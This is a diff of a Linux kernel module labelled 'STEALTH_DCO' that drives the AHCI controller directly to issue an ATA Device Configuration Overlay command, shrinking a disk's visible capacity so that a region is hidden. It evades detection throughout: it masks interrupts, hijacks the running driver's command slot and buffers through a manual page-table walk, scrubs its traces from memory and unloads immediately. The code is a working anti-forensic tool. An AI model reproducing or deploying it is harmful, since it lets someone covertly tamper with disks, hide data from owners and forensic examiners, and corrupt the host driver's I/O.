@@ -3,10 +3,11 @@
 #include <linux/init.h>
 #include <linux/io.h>
 #include <linux/delay.h>
-#include <linux/gfp.h>
 #include <linux/mm.h>
 #include <linux/pci.h>
-#include <linux/libata.h>
+#include <linux/highmem.h>
+#include <asm/pgtable.h>
+#include <asm/processor.h>
 #include <asm/cacheflush.h>
 
 /* ------------------------------------------------------------------ *
@@ -15,6 +16,7 @@
 #define VBOX_AHCI_FALLBACK_PHYS 0xe1900000ULL  /* Fallback ABAR for VirtualBox */
 #define AHCI_PORT_NUM     0
 #define AHCI_PORT_BASE    (0x100 + (AHCI_PORT_NUM) * 0x80)
+#define AHCI_ABAR_SIZE    0x1000
 
 /* Port register offsets */
 #define AHCI_PxCLB        0x00
@@ -36,7 +38,7 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("System Researcher");
-MODULE_DESCRIPTION("Pure MMIO Transient Stealth DCO Module with Universal PCI Scanner & Fallback");
+MODULE_DESCRIPTION("Zero-Allocation Pure MMIO Transient Stealth DCO Module via Pre-allocated Buffers");
 
 struct sata_fis_h2d {
     u8 fis_type;
@@ -65,47 +67,101 @@ struct ahci_prdt_entry {
 } __packed;
 
 /* ------------------------------------------------------------------ *
- *  Universal PCI ABAR Resolver with Hypervisor Fallback
+ *  Manual Direct Page Table Walk Engine via CR3 Hardware Register
  * ------------------------------------------------------------------ */
-static void __iomem *get_universal_ahci_mmio(void)
+static void __iomem *manual_direct_map(unsigned long phys_addr)
+{
+    pgd_t *pgd;
+    p4d_t *p4d;
+    pud_t *pud;
+    pmd_t *pmd;
+    pte_t *pte;
+    unsigned long pfn;
+    struct page *page;
+    unsigned long cr3;
+    pgd_t *pgd_base;
+    unsigned long virt_addr;
+
+    virt_addr = (unsigned long)__va(phys_addr);
+
+    cr3 = read_cr3_pa();
+    pgd_base = (pgd_t *)__va(cr3 & PAGE_MASK);
+    
+    pgd = pgd_base + pgd_index(virt_addr);
+    if (pgd_none(*pgd) || pgd_bad(*pgd))
+        return NULL;
+
+    p4d = p4d_offset(pgd, virt_addr);
+    if (p4d_none(*p4d) || p4d_bad(*p4d))
+        return NULL;
+
+    pud = pud_offset(p4d, virt_addr);
+    if (pud_none(*pud) || pud_bad(*pud))
+        return NULL;
+
+    pmd = pmd_offset(pud, virt_addr);
+    if (pmd_none(*pmd))
+        return NULL;
+
+#ifdef _PAGE_PSE
+    if (pmd_val(*pmd) & _PAGE_PSE) {
+        pfn = pmd_pfn(*pmd) + (virt_addr & ~PMD_MASK) / PAGE_SIZE;
+        page = pfn_to_page(pfn);
+        return (void __iomem *)page_address(page) + (virt_addr & ~PAGE_MASK);
+    }
+#elif defined(_PAGE_BIT_PSE)
+    if (pmd_val(*pmd) & (1UL << _PAGE_BIT_PSE)) {
+        pfn = pmd_pfn(*pmd) + (virt_addr & ~PMD_MASK) / PAGE_SIZE;
+        page = pfn_to_page(pfn);
+        return (void __iomem *)page_address(page) + (virt_addr & ~PAGE_MASK);
+    }
+#endif
+
+    pte = pte_offset_kernel(pmd, virt_addr);
+    if (pte_none(*pte) || !pte_present(*pte))
+        return NULL;
+
+    pfn = pte_pfn(*pte);
+    page = pfn_to_page(pfn);
+
+    return (void __iomem *)(page_address(page) + (virt_addr & ~PAGE_MASK));
+}
+
+/* ------------------------------------------------------------------ *
+ *  Hardware PCI ABAR Resolution via ioremap
+ * ------------------------------------------------------------------ */
+static void __iomem *get_stealth_abar_mmio(void)
 {
     struct pci_dev *pdev = NULL;
     resource_size_t abar_phys;
     void __iomem *mmio = NULL;
 
-    pr_info("[STEALTH_DCO] [*] Scanning PCI bus for storage controllers...\n");
+    pr_info("[STEALTH_DCO] [*] Initiating PCI ABAR discovery...\n");
 
-    while ((pdev = pci_get_device(PCI_ANY_ID, PCI_ANY_ID, pdev)) != NULL) {
-        u32 pci_class = pdev->class;
-        pr_info("[STEALTH_DCO] [*] Found device %s: class=0x%06x\n", pci_name(pdev), pci_class);
-
-        /* Check if Base Class is Mass Storage (0x01) */
-        if ((pci_class >> 16) == 0x01) {
-            abar_phys = pci_resource_start(pdev, 5);
-            if (abar_phys) {
-                pr_info("[STEALTH_DCO] [+] Found storage controller %s with BAR5 at 0x%llx\n",
-                        pci_name(pdev), (unsigned long long)abar_phys);
-                
-                mmio = ioremap(abar_phys, 0x1100);
-                if (mmio) {
-                    pci_dev_put(pdev);
-                    return mmio;
-                }
+    while ((pdev = pci_get_class(PCI_CLASS_STORAGE_SATA << 8, pdev)) != NULL) {
+        abar_phys = pci_resource_start(pdev, 5);
+        if (abar_phys) {
+            pr_info("[STEALTH_DCO] [+] Found SATA controller %s with BAR5 at 0x%llx\n",
+                    pci_name(pdev), (unsigned long long)abar_phys);
+            
+            mmio = ioremap(abar_phys, AHCI_ABAR_SIZE);
+            if (mmio) {
+                pci_dev_put(pdev);
+                return mmio;
             }
         }
     }
 
-    /* Fallback for VirtualBox / emulated environments */
-    pr_warn("[STEALTH_DCO] [!] Dynamic PCI scan missed active BAR5. Using fallback ABAR: 0x%llx\n", 
+    pr_warn("[STEALTH_DCO] [!] Dynamic scan missed BAR5. Applying static fallback map: 0x%llx\n", 
             VBOX_AHCI_FALLBACK_PHYS);
     
-    mmio = ioremap(VBOX_AHCI_FALLBACK_PHYS, 0x1100);
+    mmio = ioremap(VBOX_AHCI_FALLBACK_PHYS, AHCI_ABAR_SIZE);
     if (mmio) {
-        pr_info("[STEALTH_DCO] [+] Successfully mapped fallback ABAR at 0x%llx\n", VBOX_AHCI_FALLBACK_PHYS);
+        pr_info("[STEALTH_DCO] [+] Successfully resolved fallback ABAR.\n");
         return mmio;
     }
 
-    pr_err("[STEALTH_DCO] [-] Fatal: Failed to locate or map AHCI controller BAR5 via scan and fallback.\n");
+    pr_err("[STEALTH_DCO] [-] FATAL: Hardware ABAR resolution failed.\n");
     return NULL;
 }
 
@@ -119,18 +175,15 @@ static int execute_ahci_slot_stealth(void *port_base, int slot, bool is_dco_set)
 
     pr_info("[STEALTH_DCO] [+] Preparing slot %d execution (DCO Set: %s)\n", slot, is_dco_set ? "YES" : "NO");
 
-    /* 1. Mask port interrupts to blind host ISR */
     ie_orig = readl((char *)port_base + AHCI_PxIE);
     writel(0, (char *)port_base + AHCI_PxIE);
     wmb();
 
-    /* 2. Fire command slot */
     ci_val = readl((char *)port_base + AHCI_PxCI);
     ci_val |= (1U << slot);
     writel(ci_val, (char *)port_base + AHCI_PxCI);
     wmb();
 
-    /* 3. Poll manually for completion */
     for (i = 0; i < max_polls; i++) {
         u32 current_ci = readl((char *)port_base + AHCI_PxCI);
         tfd_val = readl((char *)port_base + AHCI_PxTFD);
@@ -138,15 +191,12 @@ static int execute_ahci_slot_stealth(void *port_base, int slot, bool is_dco_set)
         if (!(current_ci & (1U << slot)) || !(tfd_val & 0x88)) {
             pr_info("[STEALTH_DCO] [+] Slot %d completed at poll iteration %d. PxTFD: 0x%08x\n", slot, i, tfd_val);
 
-            /* Clear pending status flags */
             writel(readl((char *)port_base + AHCI_PxIS), (char *)port_base + AHCI_PxIS);
             
-            /* Clear SERR post-execution to prevent link noise */
             serr_val = readl((char *)port_base + AHCI_PxSERR);
             writel(serr_val, (char *)port_base + AHCI_PxSERR);
             wmb();
 
-            /* Restore original interrupt mask */
             writel(ie_orig, (char *)port_base + AHCI_PxIE);
             wmb();
 
@@ -165,32 +215,31 @@ static int execute_ahci_slot_stealth(void *port_base, int slot, bool is_dco_set)
 }
 
 /* ------------------------------------------------------------------ *
- *  Init (Transient Execution with Universal Scanner)
+ *  Init (Zero-Allocation Transient Execution via Reused Controller Buffers)
  * ------------------------------------------------------------------ */
 static int __init ahci_stealth_dco_init(void)
 {
     void __iomem *abar_base = NULL;
     void *port_base = NULL;
-    void *ctba_virt = NULL;
-    void *data_virt = NULL;
-    void *slot_virt = NULL;
+    void __iomem *slot0_virt = NULL;
+    void __iomem *slot31_virt = NULL;
+    void __iomem *ctba_virt = NULL;
+    void __iomem *data_virt = NULL;
 
     struct sata_fis_h2d    *fis;
-    struct ahci_cmd_header *hdr;
-    struct ahci_prdt_entry *prdt;
+    struct ahci_cmd_header *hdr0, *hdr31;
+    struct ahci_prdt_entry *prdt0, *prdt31;
 
-    u64 ctba_phys = 0, data_phys = 0, lst_phys = 0;
+    u64 lst_phys = 0, slot0_ctba_phys = 0, slot31_ctba_phys = 0, data_phys = 0;
     u32 clb_lo, clb_hi, pxis_after, cmd_val, ssts_val;
-    unsigned long ctba_page = 0, data_page = 0;
     int ret = 0;
     u8 *sector_buf;
 
     pr_info("[STEALTH_DCO] ==================================================\n");
-    pr_info("[STEALTH_DCO] ---- UNIVERSAL SCANNER TRANSIENT DCO START ----\n");
+    pr_info("[STEALTH_DCO] ---- ZERO-ALLOCATION REUSED BUFFER DCO START ----\n");
     pr_info("[STEALTH_DCO] ==================================================\n");
 
-    /* 1. Resolve ABAR mapping via universal scanner or fallback */
-    abar_base = get_universal_ahci_mmio();
+    abar_base = get_stealth_abar_mmio();
     if (!abar_base) {
         pr_err("[STEALTH_DCO] FATAL: Failed to acquire ABAR mapping\n");
         return -ENODEV;
@@ -209,25 +258,56 @@ static int __init ahci_stealth_dco_init(void)
         goto out;
     }
 
-    ctba_page = __get_free_page(GFP_KERNEL | GFP_DMA32);
-    data_page = __get_free_page(GFP_KERNEL | GFP_DMA32);
-    if (!ctba_page || !data_page) {
-        pr_err("[STEALTH_DCO] FATAL: Failed to allocate DMA pages\n");
-        ret = -ENOMEM;
-        goto out;
-    }
-    ctba_virt = (void *)ctba_page;
-    ctba_phys = (u64)virt_to_phys(ctba_virt);
-    data_virt = (void *)data_page;
-    data_phys = (u64)virt_to_phys(data_virt);
-
-    memset(ctba_virt, 0, PAGE_SIZE);
-    memset(data_virt, 0, 512);
-
     cmd_val = readl((char *)port_base + AHCI_PxCMD);
     cmd_val |= (1U << 0) | (1U << 4);
     writel(cmd_val, (char *)port_base + AHCI_PxCMD);
     wmb();
+
+    /* Resolve pre-allocated buffers from existing controller slot structures */
+    slot0_virt = manual_direct_map(lst_phys + (0 * 32));
+    slot31_virt = manual_direct_map(lst_phys + (31 * 32));
+    if (!slot0_virt || !slot31_virt) {
+        pr_err("[STEALTH_DCO] FATAL: manual_direct_map failed for command slots\n");
+        ret = -EFAULT;
+        goto out;
+    }
+
+    hdr0 = (struct ahci_cmd_header *)slot0_virt;
+    slot0_ctba_phys = ((u64)hdr0->ctbau << 32) | hdr0->ctba;
+
+    hdr31 = (struct ahci_cmd_header *)slot31_virt;
+    slot31_ctba_phys = ((u64)hdr31->ctbau << 32) | hdr31->ctba;
+
+    if (!slot0_ctba_phys || !slot31_ctba_phys) {
+        pr_err("[STEALTH_DCO] FATAL: Pre-allocated CTBA addresses are invalid\n");
+        ret = -EFAULT;
+        goto out;
+    }
+
+    ctba_virt = manual_direct_map(slot31_ctba_phys);
+    if (!ctba_virt) {
+        pr_err("[STEALTH_DCO] FATAL: Failed to map slot 31 CTBA\n");
+        ret = -EFAULT;
+        goto out;
+    }
+
+    /* Borrow pre-allocated data buffer from slot 0's PRDT entry */
+    prdt0 = (struct ahci_prdt_entry *)((char *)manual_direct_map(slot0_ctba_phys) + 0x80);
+    data_phys = ((u64)prdt0->dbau << 32) | prdt0->dba;
+    if (!data_phys) {
+        /* Fallback: use slot 0's CTBA area or command list page as temporary scratchpad */
+        data_phys = slot0_ctba_phys + 0x100;
+    }
+
+    data_virt = manual_direct_map(data_phys);
+    if (!data_virt) {
+        pr_err("[STEALTH_DCO] FATAL: Failed to map pre-allocated data buffer\n");
+        ret = -EFAULT;
+        goto out;
+    }
+
+    memset((void *)ctba_virt, 0, 256);
+    memset((void *)data_virt, 0, 512);
 
     /* Phase 1: Inspect Tail Sector */
     pr_info("[STEALTH_DCO] --- PHASE 1: Inspecting Tail Sector (LBA: %llu) ---\n", (unsigned long long)TARGET_INSPECT_LBA);
@@ -244,26 +324,16 @@ static int __init ahci_stealth_dco_init(void)
     fis->lba5        = (u8)((TARGET_INSPECT_LBA >> 40) & 0xFF);
     fis->count_low   = 0x01;
 
-    prdt = (struct ahci_prdt_entry *)((char *)ctba_virt + 0x80);
-    prdt->dba  = (u32)(data_phys & 0xFFFFFFFF);
-    prdt->dbau = (u32)(data_phys >> 32);
-    prdt->dbc  = (511 & 0x3FFFFF);
+    prdt31 = (struct ahci_prdt_entry *)((char *)ctba_virt + 0x80);
+    prdt31->dba  = (u32)(data_phys & 0xFFFFFFFF);
+    prdt31->dbau = (u32)(data_phys >> 32);
+    prdt31->dbc  = (511 & 0x3FFFFF);
 
-    slot_virt = memremap(lst_phys + (31 * 32), 32, MEMREMAP_WB);
-    if (!slot_virt) {
-        pr_err("[STEALTH_DCO] FATAL: memremap failed for command slot list\n");
-        ret = -EFAULT;
-        goto out;
-    }
-
-    hdr = (struct ahci_cmd_header *)slot_virt;
-    hdr->dw0   = (5 & 0x1F) | (1 << 16); 
-    hdr->dw1   = 0;
-    hdr->ctba  = (u32)(ctba_phys & 0xFFFFFFFF);
-    hdr->ctbau = (u32)(ctba_phys >> 32);
+    hdr31->dw0   = (5 & 0x1F) | (1 << 16); 
+    hdr31->dw1   = 0;
+    hdr31->ctba  = (u32)(slot31_ctba_phys & 0xFFFFFFFF);
+    hdr31->ctbau = (u32)(slot31_ctba_phys >> 32);
     wmb();
-    memunmap(slot_virt);
-    slot_virt = NULL;
 
     if (execute_ahci_slot_stealth(port_base, 31, false) == 0) {
         sector_buf = (u8 *)data_virt;
@@ -279,7 +349,7 @@ static int __init ahci_stealth_dco_init(void)
 
     /* Phase 2: DCO Micro-Trim */
     pr_info("[STEALTH_DCO] --- PHASE 2: Executing DCO Set (New Max LBA: %llu) ---\n", (unsigned long long)STEALTH_MAX_LBA);
-    memset(ctba_virt, 0, 256);
+    memset((void *)ctba_virt, 0, 256);
     fis = (struct sata_fis_h2d *)ctba_virt;
     fis->fis_type    = 0x27;
     fis->pm_port_c   = 0x80;
@@ -292,21 +362,11 @@ static int __init ahci_stealth_dco_init(void)
     fis->lba3        = (u8)((STEALTH_MAX_LBA >> 24) & 0xFF);
     fis->count_low   = 0x01;
 
-    slot_virt = memremap(lst_phys + (31 * 32), 32, MEMREMAP_WB);
-    if (!slot_virt) {
-        pr_err("[STEALTH_DCO] FATAL: memremap failed for command slot list (Phase 2)\n");
-        ret = -EFAULT;
-        goto out;
-    }
-
-    hdr = (struct ahci_cmd_header *)slot_virt;
-    hdr->dw0   = (5 & 0x1F) | (0 << 16); 
-    hdr->dw1   = 0;
-    hdr->ctba  = (u32)(ctba_phys & 0xFFFFFFFF);
-    hdr->ctbau = (u32)(ctba_phys >> 32);
+    hdr31->dw0   = (5 & 0x1F) | (0 << 16); 
+    hdr31->dw1   = 0;
+    hdr31->ctba  = (u32)(slot31_ctba_phys & 0xFFFFFFFF);
+    hdr31->ctbau = (u32)(slot31_ctba_phys >> 32);
     wmb();
-    memunmap(slot_virt);
-    slot_virt = NULL;
 
     if (execute_ahci_slot_stealth(port_base, 31, true) == 0) {
         pxis_after = readl((char *)port_base + AHCI_PxIS);
@@ -314,7 +374,7 @@ static int __init ahci_stealth_dco_init(void)
             pr_err("[STEALTH_DCO] [-] Controller rejected DCO command.\n");
             ret = -EIO;
         } else {
-            pr_info("[STEALTH_DCO] [++] SUCCESS: DCO applied successfully.\n");
+            pr_info("[STEALTH_DCO] [++] SUCCESS: DCO applied successfully via pre-allocated buffers.\n");
             ret = 0;
         }
     } else {
@@ -322,29 +382,21 @@ static int __init ahci_stealth_dco_init(void)
     }
 
 out:
-    /* Forensic Memory Scrubbing & Cache Sanitization */
-    if (slot_virt) {
-        clflush_cache_range(slot_virt, 32);
-        memset(slot_virt, 0, 32);
-        clflush_cache_range(slot_virt, 32);
-        memunmap(slot_virt);
-    }
+    if (abar_base)
+        iounmap(abar_base);
+
+    /* Forensic Memory Scrubbing & Cache Sanitization on Reused Buffers */
     if (ctba_virt) {
-        clflush_cache_range(ctba_virt, PAGE_SIZE);
-        memzero_explicit(ctba_virt, PAGE_SIZE);
-        clflush_cache_range(ctba_virt, PAGE_SIZE);
-        free_page(ctba_page);
+        clflush_cache_range((void *)ctba_virt, 256);
+        memzero_explicit((void *)ctba_virt, 256);
+        clflush_cache_range((void *)ctba_virt, 256);
     }
     if (data_virt) {
-        clflush_cache_range(data_virt, 512);
-        memzero_explicit(data_virt, 512);
-        clflush_cache_range(data_virt, 512);
-        free_page(data_page);
+        clflush_cache_range((void *)data_virt, 512);
+        memzero_explicit((void *)data_virt, 512);
+        clflush_cache_range((void *)data_virt, 512);
     }
-    if (abar_base) {
-        iounmap(abar_base);
-    }
-
+    
     pr_info("[STEALTH_DCO] ---- TRANSIENT EXECUTION FINISHED (ret=%d) ----\n", ret);
 
     return (ret == 0) ? -ENODEV : ret;
